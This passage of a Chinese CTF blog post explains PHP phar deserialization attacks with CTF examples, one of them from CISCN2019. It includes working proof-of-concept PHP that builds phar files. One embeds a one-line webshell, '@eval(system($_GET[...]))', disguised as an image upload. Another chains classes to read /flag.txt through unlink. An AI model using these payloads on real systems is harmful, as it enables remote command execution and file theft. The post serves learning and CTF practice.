class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">	highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>看到上述代码，关键在于这一段语句 “file_exists($filename);” ，如果可以绕过文件上传点，则可以利用反序列化生成一个phar文件，而这个phar文件则是php可以执行的，则可以在其中写入一句话木马，从而getshell。其poc如下：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">	<span class="class"><span class="keyword">class</span> <span class="title">MyClass</span></span>&#123;</span></span><br><span class="line"><span class="php">		<span class="keyword">var</span> $output = <span class="string">'@eval(system($_GET["a"]));'</span>;</span></span><br><span class="line"><span class="php">	&#125;</span></span><br><span class="line"><span class="php">	$payload = <span class="keyword">new</span> MyClass();</span></span><br><span class="line"><span class="php">	unlink(<span class="string">"temp.phar"</span>);</span></span><br><span class="line"><span class="php">	$phar = <span class="keyword">new</span> Phar(<span class="string">"temp.phar"</span>);</span></span><br><span class="line"><span class="php">	$phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); </span></span><br><span class="line"><span class="php">	$phar-&gt;setMetadata($payload);</span></span><br><span class="line"><span class="php">	$phar-&gt;addFromString(<span class="string">'test.txt'</span>, <span class="string">'Hello world!'</span>);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
<p>用上述代码构建一个phar文件，再将其后缀名修改为gif，则可以绕过上传，上传成功后直接访问该gif文件，并利用传入的一句话木马getshell，拿到flag。</p>
<p>由这个例子，可以对phar反序列化漏洞的利用有一个初步的了解，而对于这样的利用过程来说，一般需要满足以下条件：</p>
<ul>
<li>phar文件要能够上传到服务器端</li>
<li>要有可用的魔术方法作为&quot;跳板&quot;</li>
<li>要有文件操作函数，如file_exists()，fopen()，file_get_contents()，file()</li>
<li>文件操作函数的参数可控，且:phar等特殊字符没有被过滤</li>
</ul>
<p>继续看示例二（来源 CISCN2019 华北赛区 Day1 Web1）：</p>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line"><span class="comment">//题目中有一个download.php，可以在这一页面下载时抓包修改文件名，将源码down下来，主要有以下页面：</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span>.php</span><br><span class="line">delete.php</span><br><span class="line">download.php</span><br><span class="line">index.php</span><br><span class="line">login.php</span><br><span class="line">upload.php</span><br><span class="line"></span><br><span class="line"><span class="comment">//upload.php中存在文件上传点，且限定文件上传类型为jpg</span></span><br><span class="line"><span class="comment">//漏洞主要存在于delete.php和class.php中</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//class.php关键代码</span></span><br><span class="line"></span><br><span class="line">public function __destruct() &#123;</span><br><span class="line">        <span class="variable">$table</span> = '&lt;div id=<span class="string">"container"</span> <span class="keyword">class</span>=<span class="string">"container"</span>&gt;&lt;div <span class="keyword">class</span>=<span class="string">"table-responsive"</span>&gt;&lt;<span class="keyword">table</span> id=<span class="string">"table"</span> <span class="keyword">class</span>=<span class="string">"table table-bordered table-hover sm-font"</span>&gt;';</span><br><span class="line">        <span class="variable">$table</span> .= '&lt;thead&gt;&lt;tr&gt;';</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$this</span>-&gt;funcs <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">            <span class="variable">$table</span> .= '&lt;th scope=<span class="string">"col"</span> <span class="keyword">class</span>=<span class="string">"text-center"</span>&gt;' . htmlentities(<span class="variable">$func</span>) . '&lt;/th&gt;';</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$table</span> .= '&lt;th scope=<span class="string">"col"</span> <span class="keyword">class</span>=<span class="string">"text-center"</span>&gt;Opt&lt;/th&gt;';</span><br><span class="line">        <span class="variable">$table</span> .= '&lt;/thead&gt;&lt;tbody&gt;';</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$this</span>-&gt;results <span class="keyword">as</span> <span class="variable">$filename</span> =&gt; <span class="variable">$result</span>) &#123;</span><br><span class="line">            <span class="variable">$table</span> .= '&lt;tr&gt;';</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$result</span> <span class="keyword">as</span> <span class="variable">$func</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">                <span class="variable">$table</span> .= '&lt;td <span class="keyword">class</span>=<span class="string">"text-center"</span>&gt;' . htmlentities(<span class="variable">$value</span>) . '&lt;/td&gt;';</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$table</span> .= '&lt;td <span class="keyword">class</span>=<span class="string">"text-center"</span> filename=<span class="string">"' . htmlentities($filename) . '"</span>&gt;&lt;a href=<span class="string">"#"</span> <span class="keyword">class</span>=<span class="string">"download"</span>&gt;下载&lt;/a&gt; / &lt;a href=<span class="string">"#"</span> <span class="keyword">class</span>=<span class="string">"delete"</span>&gt;删除&lt;/a&gt;&lt;/td&gt;';</span><br><span class="line">            <span class="variable">$table</span> .= '&lt;/tr&gt;';</span><br><span class="line">        &#125;</span><br><span class="line">        echo <span class="variable">$table</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public function detele() &#123;</span><br><span class="line">    unlink(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//delete.php关键代码</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">"class.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">chdir</span>(<span class="variable">$_SESSION</span>['sandbox']);</span><br><span class="line"><span class="variable">$file</span> = new <span class="keyword">File</span>();</span><br><span class="line"><span class="variable">$filename</span> = (string) <span class="variable">$_POST</span>['filename'];</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strlen</span>(<span class="variable">$filename</span>) &lt; 40 &amp;&amp; <span class="variable">$file</span>-&gt;<span class="keyword">open</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">    <span class="variable">$file</span>-&gt;detele();</span><br><span class="line">    Header(<span class="string">"Content-type: application/json"</span>);</span><br><span class="line">    <span class="variable">$response</span> = array(<span class="string">"success"</span> =&gt; true, <span class="string">"error"</span> =&gt; <span class="string">""</span>);</span><br><span class="line">    echo json_encode(<span class="variable">$response</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    Header(<span class="string">"Content-type: application/json"</span>);</span><br><span class="line">    <span class="variable">$response</span> = array(<span class="string">"success"</span> =&gt; false, <span class="string">"error"</span> =&gt; <span class="string">"File not exist"</span>);</span><br><span class="line">    echo json_encode(<span class="variable">$response</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>对上述代码进行分析，可以看到，在class.php中的Filelist类中的__destruct可以读取任意文件，而class.php中的delete函数又使用了unlink函数，且被delete.php调用，于是可以通过上传符合上传文件类型的文件，并将命令写入在文件中，上传成功后删除文件，从而在调用delete函数时触发反序列化漏洞，读取flag文件。构造phar文件的poc如下，生成后需要将其修改为jpg文件上传：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">    <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> $db;</span></span><br><span class="line"><span class="php">    &#125; </span></span><br><span class="line"><span class="php">    <span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> $filename;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name)</span></span>&#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;filename=$name;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">private</span> $files;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;files=<span class="keyword">array</span>(<span class="keyword">new</span> File(<span class="string">'/flag.txt'</span>));</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125; </span></span><br><span class="line"><span class="php">    $o = <span class="keyword">new</span> User();</span></span><br><span class="line"><span class="php">    $o-&gt;db =<span class="keyword">new</span> FileList();</span></span><br><span class="line"><span class="php">    @unlink(<span class="string">"phar.phar"</span>);</span></span><br><span class="line"><span class="php">    $phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>);</span></span><br><span class="line"><span class="php">    $phar-&gt;startBuffering();</span></span><br><span class="line"><span class="php">    $phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>);</span></span><br><span class="line"><span class="php">    $phar-&gt;setMetadata($o);</span></span><br><span class="line"><span class="php">    $phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); </span></span><br><span class="line"><span class="php">    $phar-&gt;stopBuffering();</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
<p>emmm，或许我讲清楚了？好吧应该没有，主要还是要关注上面所说的几个符合利用的条件吧，上面的两个示例其实都是可以在里面找到符合上述所说条件的地方，因此可以利用其进行phar反序列化利用，从而实现攻击目标。</p>
<p>最后，意犹未尽的话，可以自己试试示例三（来源 HITCON 2017 Baby^H Master PHP），题目<a href="https://github.com/xiaoZ-hc/Vulnerability-Repository/tree/master/HITCON2017%20Baby%5EH%20Master%20PHP_%E9%95%9C%E5%83%8F" target="_blank" rel="noopener">下载地址</a>。</p>
</div><div class="tags"><a href="/tags/CTF/">CTF</a><a href="/tags/Web%E6%BC%8F%E6%B4%9E/">Web漏洞</a><a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">反序列化</a></div><div class="post-nav"><a class="pre" href="/2020/05/13/%E7%BD%91%E9%BC%8E%E6%9D%AF2020-%E9%9D%92%E9%BE%99%E7%BB%84-%E9%83%A8%E5%88%86WP/">网鼎杯2020-青龙组-部分WP</a><a class="next" href="/2020/01/23/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93(%E4%B8%80)-%E5%B0%8F%E7%99%BD%E6%96%87/">PHP反序列化总结(一)-小白文</a></div></div></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> Categories</i></div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-writeup/">CTF_writeup</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D/">Web漏洞介绍</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/">密码学</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BC%96%E7%A0%81%E4%B8%8E%E5%BC%80%E5%8F%91/">编码与开发</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> Tags</i></div><div class="tagcloud"><a href="/tags/Web/" style="font-size: 15px;">Web</a> <a href="/tags/CTF/" style="font-size: 15px;">CTF</a> <a href="/tags/WP/" style="font-size: 15px;">WP</a> <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%90%86%E8%AE%BA/" style="font-size: 15px;">网络安全理论</a> <a href="/tags/%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%93%8D%E4%BD%9C/" style="font-size: 15px;">字符串操作</a> <a href="/tags/%E5%BC%80%E5%8F%91/" style="font-size: 15px;">开发</a> <a href="/tags/writeup/" style="font-size: 15px;">writeup</a> <a href="/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/" style="font-size: 15px;">密码学</a> <a href="/tags/%E5%93%88%E5%B8%8C%E5%87%BD%E6%95%B0/" style="font-size: 15px;">哈希函数</a> <a href="/tags/Web%E6%BC%8F%E6%B4%9E/" style="font-size: 15px;">Web漏洞</a> <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 15px;">反序列化</a> <a href="/tags/SSRF/" style="font-size: 15px;">SSRF</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> Recent</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2020/05/13/%E7%BD%91%E9%BC%8E%E6%9D%AF2020-%E9%9D%92%E9%BE%99%E7%BB%84-%E9%83%A8%E5%88%86WP/">网鼎杯2020-青龙组-部分WP</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/01/28/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93(%E4%BA%8C)-%E5%B0%8F%E7%99%BD%E6%96%87/">PHP反序列化总结(二)</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/01/23/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93(%E4%B8%80)-%E5%B0%8F%E7%99%BD%E6%96%87/">PHP反序列化总结(一)-小白文</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/12/17/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%88%9D%E6%8E%A2/">正则表达式初探</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/12/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0%E2%80%94%E5%AF%86%E7%A0%81%E6%9D%82%E5%87%91%E5%87%BD%E6%95%B0/">密码学学习—密码杂凑函数</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/02/xctf-oj-web-wtf-sh/">xctf_oj_web_wtf.sh</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/09/19/xctf-oj-web%E7%B3%BB%E5%88%97WP/">xctf_oj_web系列WP</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/09/15/SSRF%E7%AE%80%E4%BB%8B-%E5%B0%8F%E7%99%BD%E6%96%87/">SSRF简介-小白文</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/09/03/%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2/">写在前面</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> Links</i></div><ul></ul><a href="https://momomoxiaoxi.com/" title="moxiaoxi" target="_blank">moxiaoxi</a><ul></ul><a href="http://w0.nisl.cf/" title="crawler_test_index" target="_blank">crawler_test_index</a></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer">Copyright © 2020 <a href="/." rel="nofollow">xiaoZ's Blog.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a><a rel="nofollow" target="_blank" href="https://github.com/tufu9441/maupassant-hexo"> Theme</a> by<a rel="nofollow" target="_blank" href="https://github.com/pagecho"> Cho.</a></div></div></div><a class="show" id="rocket" href="#top"></a><script type="text/javascript" src="/js/totop.js?v=0.0.0" async></script><script type="text/javascript" src="//lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.0" async></script><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css"><script type="text/javascript" color="100,100,100" opacity="0.5" zIndex="-2" count="50" src="//cdn.bootcss.com/canvas-nest.js/1.0.1/canvas-nest.min.js"></script><script type="text/javascript" src="/js/codeblock-resizer.js?v=0.0.0"></script><script type="text/javascript" src="/js/smartresize.js?v=0.0.0"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>